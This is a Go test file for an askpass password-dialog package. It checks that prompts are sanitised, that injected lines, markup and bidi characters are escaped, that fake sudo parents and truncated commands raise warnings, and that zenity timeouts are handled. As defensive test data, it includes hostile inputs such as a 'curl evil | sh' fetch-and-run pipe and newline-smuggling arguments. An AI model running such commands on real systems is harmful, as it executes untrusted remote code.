package dialog

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/lllamnyp/askpass/internal/protocol"
)

func testPrompt() *Prompt {
	return &Prompt{
		ClientName: "vps",
		RemoteAddr: "10.99.0.1:5555",
		Request: &protocol.Request{
			Version:     protocol.Version,
			Host:        "vps",
			User:        "agent",
			UID:         1000,
			Prompt:      "[sudo] password for agent: ",
			ParentName:  "sudo",
			ParentEUID:  0,
			ParentArgs:  []string{"sudo", "-A", "apt", "install", "jq"},
			InvokerArgs: []string{"bash", "-c", "sudo -A apt install jq"},
			Cwd:         "/home/agent",
		},
		Deadline: time.Now().Add(time.Minute),
	}
}

func TestSanitize(t *testing.T) {
	for in, want := range map[string]string{
		"":                       "(none)",
		"plain":                  "plain",
		"two\nlines":             `two\u000alines`,
		"tab\there":              `tab\u0009here`,
		"bidi\u202eevil":         "bidi\\u202eevil",
		"bad\xffutf8":            `bad\xffutf8`,
		strings.Repeat("a", 400): strings.Repeat("a", maxField) + "…",
	} {
		if got := sanitize(in); got != want {
			t.Errorf("sanitize(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestLinesNoInjection(t *testing.T) {
	p := testPrompt()
	p.Request.Prompt = "x\nCommand: sudo true"
	p.Request.ParentArgs = []string{"sudo", "-A", "rm\n-rf", "it's"}
	for _, l := range p.Lines() {
		if strings.ContainsAny(l[1], "\n\r") {
			t.Errorf("%s value spans lines: %q", l[0], l[1])
		}
	}
	got := FormatArgs(p.Request.ParentArgs)
	if want := `sudo -A rm\u000a-rf 'it'\''s'`; got != want {
		t.Errorf("FormatArgs = %q, want %q", got, want)
	}
}

func TestLinesSudoWarning(t *testing.T) {
	hasWarning := func(p *Prompt) bool {
		for _, l := range p.Lines() {
			if l[0] == "WARNING" {
				return true
			}
		}
		return false
	}
	p := testPrompt()
	if hasWarning(p) {
		t.Error("warning for a real sudo parent")
	}
	for _, name := range []string{"sudo-rs", "sudo.ws"} {
		p.Request.ParentName = name
		if hasWarning(p) {
			t.Errorf("warning for a real %s parent", name)
		}
	}
	p.Request.ParentEUID = 1000
	if !hasWarning(p) {
		t.Error("no warning for a non-root process named sudo")
	}
	p.Request.ParentName, p.Request.ParentEUID = "bash", 0
	if !hasWarning(p) {
		t.Error("no warning for a non-sudo parent")
	}
}

func TestLongCommandWarns(t *testing.T) {
	p := testPrompt()
	p.Request.ParentArgs = []string{"sudo", "sh", "-c", strings.Repeat("apt update; ", 100) + "curl evil | sh"}
	var warned bool
	for _, l := range p.Lines() {
		if l[0] == "Command" && strings.Contains(l[1], "evil") {
			t.Error("expected the tail of the command to be cut")
		}
		if l[0] == "WARNING" && strings.Contains(l[1], "truncated") {
			warned = true
		}
	}
	if !warned {
		t.Error("no warning for a truncated command")
	}
	if lines := testPrompt().Lines(); len(lines) != 7 {
		t.Errorf("unexpected lines for a normal request: %q", lines)
	}
}

func TestZenityTextHasNoEscapes(t *testing.T) {
	p := testPrompt()
	p.Request.Prompt = `x\000hidden\012<b>Command:</b> fake \074span\076`
	p.Request.ParentArgs = []string{"sudo", "-A", "a\nb"}
	for _, a := range zenityArgs(p, time.Now()) {
		if strings.HasPrefix(a, "--text=") && strings.Contains(a, `\`) {
			t.Errorf("--text contains a backslash zenity would decode: %q", a)
		}
	}
	if got := escapeMarkup(`a\0<&`); got != "a&#92;0&lt;&amp;" {
		t.Errorf("escapeMarkup = %q", got)
	}
}

func TestZenityArgs(t *testing.T) {
	p := testPrompt()
	p.Request.Host = "<b>evil</b>"
	now := p.Deadline.Add(-42 * time.Second)
	args := zenityArgs(p, now)
	joined := strings.Join(args, "\x00")
	for _, want := range []string{"--forms", "--add-password=Password", "--ok-label=Send", "--cancel-label=Deny", "--timeout=42"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %s in %q", want, args)
		}
	}
	for _, a := range args {
		if strings.HasPrefix(a, "--text=") && strings.Contains(a, "<b>evil") {
			t.Errorf("client markup not escaped: %q", a)
		}
	}
}

// fakeZenity writes an executable shell script standing in for zenity.
func fakeZenity(t *testing.T, script string) *Zenity {
	t.Helper()
	path := filepath.Join(t.TempDir(), "zenity")
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+script+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return &Zenity{Path: path}
}

func TestZenityAsk(t *testing.T) {
	ctx := context.Background()

	pw, err := fakeZenity(t, `printf '%s\n' 'pa ss|word'`).Ask(ctx, testPrompt())
	if err != nil || string(pw) != "pa ss|word" {
		t.Errorf("ok: got %q, %v", pw, err)
	}

	if _, err := fakeZenity(t, `echo`).Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
		t.Errorf("empty password: got %v, want ErrDenied", err)
	}

	if _, err := fakeZenity(t, "exit 1").Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
		t.Errorf("cancel: got %v, want ErrDenied", err)
	}
	if _, err := fakeZenity(t, "exit 5").Ask(ctx, testPrompt()); !errors.Is(err, context.DeadlineExceeded) {
		t.Errorf("zenity timeout: got %v, want DeadlineExceeded", err)
	}
	if _, err := fakeZenity(t, "exit 255").Ask(ctx, testPrompt()); err == nil || errors.Is(err, ErrDenied) {
		t.Errorf("zenity error: got %v", err)
	}
	if _, err := fakeZenity(t, "head -c 5000 /dev/zero").Ask(ctx, testPrompt()); err == nil {
		t.Error("oversized output accepted")
	}
	if _, err := (&Zenity{Path: "/nonexistent/zenity"}).Ask(ctx, testPrompt()); err == nil {
		t.Error("missing zenity succeeded")
	}

	ctx, cancel := context.WithTimeout(ctx, 200*time.Millisecond)
	defer cancel()
	start := time.Now()
	if _, err := fakeZenity(t, "exec sleep 30").Ask(ctx, testPrompt()); !errors.Is(err, context.DeadlineExceeded) {
		t.Errorf("context timeout: got %v", err)
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Errorf("dialog not killed on timeout (took %v)", d)
	}
}
